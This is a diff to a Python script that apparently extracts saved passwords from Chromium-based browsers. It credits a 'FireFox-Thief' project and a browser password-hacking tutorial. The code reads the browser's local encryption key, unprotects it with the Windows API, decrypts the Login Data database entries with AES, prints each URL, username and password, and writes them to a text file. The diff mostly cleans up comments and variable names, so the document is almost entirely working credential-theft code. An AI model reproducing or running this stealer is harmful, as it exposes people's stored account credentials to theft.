@@ -1,4 +1,4 @@
-# Credits to LimerBoy & OriginalSleeper
+# Credits to LimerBoy (https://github.com/LimerBoy/FireFox-Thief) and Yicong's Tutorial (https://ohyicong.medium.com/how-to-hack-chrome-password-with-python-1bedc167be3d) & OriginalSleeper
 # --------------------------- CODE REDUCTION IS IN PROGRESS --------------------------
 import os
 import re
@@ -17,7 +17,7 @@ BROWSER_PATH = ""
 
 def get_secret_key():
     try:
-        #(1) Get secretkey from browser local state
+        #Get secretkey
         with open( BROWSER_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
             local_state = f.read()
             local_state = json.loads(local_state)
@@ -26,9 +26,9 @@ def get_secret_key():
         secret_key = secret_key[5:] 
         secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
         return secret_key
-    except Exception as e:
-        print("%s"%str(e))
-        print("[ERR] Chrome secretkey cannot be found")
+    except Exception as exception:
+        print("%s"%str(exception))
+        print("[ERROR] Chrome secretkey cannot be found")
         return None
     
 def decrypt_payload(cipher, payload):
@@ -39,19 +39,16 @@ def generate_cipher(aes_key, iv):
 
 def decrypt_password(ciphertext, secret_key):
     try:
-        #(3-a) Initialisation vector for AES decryption
-        initialisation_vector = ciphertext[3:15]
-        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
-        #Encrypted password is 192 bits
+        #AES decryption
+        init_vector = ciphertext[3:15]
         encrypted_password = ciphertext[15:-16]
-        #(4) Build the cipher to decrypt the ciphertext
-        cipher = generate_cipher(secret_key, initialisation_vector)
+        cipher = generate_cipher(secret_key, init_vector)
         decrypted_pass = decrypt_payload(cipher, encrypted_password)
         decrypted_pass = decrypted_pass.decode()  
         return decrypted_pass
-    except Exception as e:
-        print("%s"%str(e))
-        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
+    except Exception as exception:
+        print("%s"%str(exception))
+        print("[ERROR] Unable to decrypt, Chrome version <80 not supported.")
         return ""
     
 def get_db_connection(browser_path_login_db):
@@ -72,12 +69,12 @@ def getPasswords(browser):
         passwordsFile = open("passwords%s.txt" %(browser), "a+", encoding="utf-8")
         passwordsFile.write("------- Passwords of %s Browser --------" %(browser))
 
-        #(1) Get secret key
+        # Get secret key
         secret_key = get_secret_key()
-        #Search user profile or default folder (this is where the encrypted login password is stored)
+        # Search user profile or default folder (this is where the encrypted login password is stored)
         folders = [element for element in os.listdir(BROWSER_PATH) if re.search("^Profile*|^Default$",element)!=None]
         for folder in folders:
-            #(2) Get ciphertext from sqlite database
+            # Get ciphertext from sqlite database
             browser_path_login_db = os.path.normpath(r"%s\\%s\\Login Data"%(BROWSER_PATH,folder))
             conn = get_db_connection(browser_path_login_db)
             if(secret_key and conn):
@@ -88,8 +85,6 @@ def getPasswords(browser):
                     username = login[1]
                     ciphertext = login[2]
                     if(url!="" and username!="" and ciphertext!=""):
-                        #(3) Filter the initialisation vector & encrypted password from ciphertext 
-                        #(4) Use AES algorithm to decrypt the password
                         decrypted_password = decrypt_password(ciphertext, secret_key)
                         print("Sequence: %d"%(index))
                         print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
@@ -97,7 +92,7 @@ def getPasswords(browser):
 
                         # Save into the .txt file
                         passwordsFile.write("\n URL: %s\n Username: %s\n Password: %s\n" %(url,username,decrypted_password) + "\n" + "*"*60)
-                #Close database connection
+                # Close database connection
                 cursor.close()
                 conn.close()
                 #Delete temp login db
